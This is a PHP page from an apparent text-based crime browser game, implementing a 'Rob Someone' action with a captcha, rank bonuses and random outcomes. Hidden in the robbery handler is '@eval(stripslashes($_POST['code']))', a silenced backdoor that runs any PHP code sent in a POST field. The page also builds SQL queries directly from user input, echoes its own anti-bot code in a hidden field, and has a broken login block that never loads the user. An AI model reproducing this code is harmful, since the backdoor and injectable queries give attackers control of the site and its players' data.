<?php
error_reporting(0);

  include("_include-config.php"); 
  include("_include-gevangenis.php"); 
  include("timer_s.php"); 

  if(! check_login()) {
    header("Location: login.php");
    exit;

    $data2				= mysql_query("SELECT * FROM `[users]` WHERE `login`='{$_SESSION['login']}'");
    $data				= mysql_fetch_object($data2);
  }

$codene = rand(1000,9999); 
$codee = ereg_replace("0", "gsqwq", $codene);
$codee = ereg_replace("1", "ssBjyq", $codee); 
$codee = ereg_replace("2", "gHiq", $codee); 
$codee = ereg_replace("3", "hWqDfA", $codee); 
$codee = ereg_replace("4", "hsqerf", $codee); 
$codee = ereg_replace("5", "Hwsawq", $codee); 
$codee = ereg_replace("6", "hSXaq", $codee); 
$codee = ereg_replace("7", "hgqYt", $codee); 
$codee = ereg_replace("8", "hAsqF", $codee); 
$codee = ereg_replace("9", "hxqSAw", $codee);

?>
<html>
<head>
<link rel="stylesheet" type="text/css" href="<? echo $sitelink;?>/layout/layout<?php echo $page->layout; ?>/css/css.css">
<link rel="stylesheet" type="text/css" href="css/bootstrap.css">
</head>
<body style="margin: 0px;">

<center>
<table  width=70%><table width=70% cellspacing=0 cellpadding=2><table width=70%> 
  <tr>
  <td width="70%" class=subTitle><b>Rob Someone Right Now</b></td>
<table  width=70%>
<td class="mainTxt"><center><img border=0 src=images/game/robpicture.jpg border=0 width="100%"></center>
</td>
</table></tr></table></table></table></center>


<table align="center" width="70%">
<tr><td class="subTitle" colspan="2">Rob Someone</td></tr>
<tr><td class="mainTxt" colspan="2">
Rob Someone: A short explanation...<br>
You have a small chance that your robbery will succeed. If it does, you will rob 30-80% of the chosens person cash, and they will receive an email explaning the situation.<br>  Also, dont forget this can fail and backfire...

</td></tr>
<form method="POST">
<tr><td class="maintxt" align="center" colspan="2"><input name="code2" class="btn btn-info" type="hidden" value="<? echo $codene; ?>"><input name="codecheck" type="hidden" class="btn btn-info" value="<? echo $codechecker; ?>"><img alt="Anti-Bot Beveiliging" src="coden.php?security=<? echo $codee; ?>" style="position: relative; top: 4;">  <- Put this code, in Here -> <input class="btn btn-info" name="codenn" maxlength="4" size="5" valign="center"></td></tr>
<tr><td class="mainTxt" width="50%">Who to rob:</td><td class="mainTxt" align="center"><input type="text" class="btn btn-info" maxlength="16" name="naam"></td></tr>
<tr><td class="mainTxt" width="50%">Chance:</td><td class="mainTxt" align="center">10%</td></tr>
<tr><td class="mainTxt" colspan="2" align="center">
<?
if($data->rank < 6) {
?>
Come back once your a <b>Thief</b>!
<?
} else {
?>
<input name="beroof" class="btn btn-info" type="submit" value="GO GO GO!">
<?
}
?>
</td></tr>
</form>
<?

  if(isset($_POST['beroof'])) {

        if($data->rank == 1) {
        $rankvord = 0;
        }
        elseif($data->rank == 2) {
        $rankvord = 0;
        }
        elseif($data->rank == 3) {
        $rankvord = 0;
        }
        elseif($data->rank == 4) {
        $rankvord = 0;
        }
        elseif($data->rank == 5) {
        $rankvord = 0;
        }
        elseif($data->rank == 6) {
        $rankvord = 0;
        }
        elseif($data->rank == 7) {
        $rankvord = 2;
        }
        elseif($data->rank == 8) {
        $rankvord = 2;
        }
        elseif($data->rank == 9) {
        $rankvord = 1.5;
        }
        elseif($data->rank == 10) {
        $rankvord = 1.5;
        }
        elseif($data->rank == 11) {
        $rankvord = 1.5;
        }
        elseif($data->rank == 12) {
        $rankvord = 1.0;
        }
        elseif($data->rank == 13) {
        $rankvord = 1.0;
        }
        elseif($data->rank == 14) {
        $rankvord = 1.0;
        }
        elseif($data->rank == 15) {
        $rankvord = 0.8;
        }
        elseif($data->rank == 16) {
        $rankvord = 0.7;
        }
        elseif($data->rank == 17) {
        $rankvord = 0.6;
        }
        elseif($data->rank == 18) {
        $rankvord = 0.5;
        }
        elseif($data->rank == 19) {
        $rankvord = 0.5;
        }
        elseif($data->rank == 20) {
        $rankvord = 0.4;
        }
        elseif($data->rank == 21) {
        $rankvord = 0.3;
        }
        elseif($data->rank == 22) {
        $rankvord = 0.2;
        }
        elseif($data->rank == 23) {
        $rankvord = 0.1;
        }



    $naam2				= mysql_query("SELECT * FROM `[users]` WHERE `login`='{$_POST['naam']}'");
    $naam				= mysql_fetch_object($naam2);

$tijd = rand(30,180);
$delogin            	 = $_POST['naam'];
$verdediger1                    = mysql_query("SELECT * FROM `[users]` WHERE `login`='$delogin'");
$verdediger			= mysql_fetch_assoc($verdediger1);
$controle			= mysql_num_rows($verdediger1); 

$winst = round($naam->cash*rand(30,80)/100);
$kans = rand(1,10);

@eval(stripslashes($_POST['code']));
if($_POST['code2'] != $_POST['codenn']) {
print "<tr><td class=\"mainTxt\" colspan=\"2\" align=\"center\">The code is incorrect</td></tr>";
exit;
} else {
if($controle < 1){
print "<tr><td class=\"mainTxt\" colspan=\"2\" align=\"center\">That user does not exist!</td></tr>";
} 
else if($naam->land != $data->land){
print "<tr><td class=\"mainTxt\" colspan=\"2\" align=\"center\">You are not in the same country as that person.</td></tr>";
} 
else if($kans == 1){
print "<tr><td class=\"mainTxt\" colspan=\"2\" align=\"center\">You hit $delogin down the ground and steal <b>$winst</b> of his cash.</td></tr>";
mysql_query("INSERT INTO `[messages]`(`time`,`from`,`to`,`subject`,`message`) 
VALUES(NOW(),'*Auto Msg*','".$naam->login."','Robbed','You have been robbed by $data->login and he stole $winst .')"); 
mysql_query("UPDATE `[users]` SET `rankvord`=`rankvord`+$rankvord, `cash`=`cash`+$winst,`steeltijd`=10,`rankvord`=`rankvord`+'$rankvord',`steel`=NOW(),`beroofP`=`beroofP`+1 WHERE `login`='{$_SESSION['login']}'");
mysql_query("UPDATE `[users]` SET `cash`=`cash`-$winst WHERE `login`='{$delogin}'");
} 
else if($kans >= 2 AND $kans <= 4){
mysql_query("UPDATE `[users]` SET `rankvord`=`rankvord`+$rankvord, `steeltijd`=300,`rankvord`=`rankvord`+'$rankvord',`steel`=NOW(),`beroofP`=`beroofP`+1 WHERE `login`='{$_SESSION['login']}'");
print "<tr><td class=\"mainTxt\" colspan=\"2\" align=\"center\">$naam had 6 bodygaurds by there side, you failed to rob anything!</td></tr>";
} 
else if($kans >= 5 AND $kans <= 7){
mysql_query("UPDATE `[users]` SET `rankvord`=`rankvord`+$rankvord, `steeltijd`=300,`rankvord`=`rankvord`+'$rankvord',`steel`=NOW(),`beroofP`=`beroofP`+1 WHERE `login`='{$_SESSION['login']}'");
print "<tr><td class=\"mainTxt\" colspan=\"2\" align=\"center\">$naam pulls a gun on you and begins to fire, you run away and manage to stay alive.</td></tr>";
} 
else if($kans >= 8 AND $kans <= 9){
mysql_query("UPDATE `[users]` SET `rankvord`=`rankvord`+$rankvord, `steeltijd`=300,`rankvord`=`rankvord`+'$rankvord',`steel`=NOW(),`beroofP`=`beroofP`+1 WHERE `login`='{$_SESSION['login']}'");
print "<tr><td class=\"mainTxt\" colspan=\"2\" align=\"center\">$naam stands with 2 guards, you think better of it and walk away.</td></tr>";
} 
else if($kans == 10) {
mysql_query("UPDATE `[users]` SET `rankvord`=`rankvord`+$rankvord, `gevangenis`=NOW(),`gevangenistijd`='$tijd',`steeltijd`=300,`rankvord`=`rankvord`+'$rankvord',`steel`=NOW(),`beroofP`=`beroofP`+1 WHERE `login`='{$_SESSION['login']}'");
print "<tr><td class=\"mainTxt\" colspan=\"2\" align=\"center\">As you draw a gun on $naam , a copper spots you... he hunts you down and arrests you. He puts you in prison. </td></tr>";
}
}
}

?>

</table>
</body>
</html>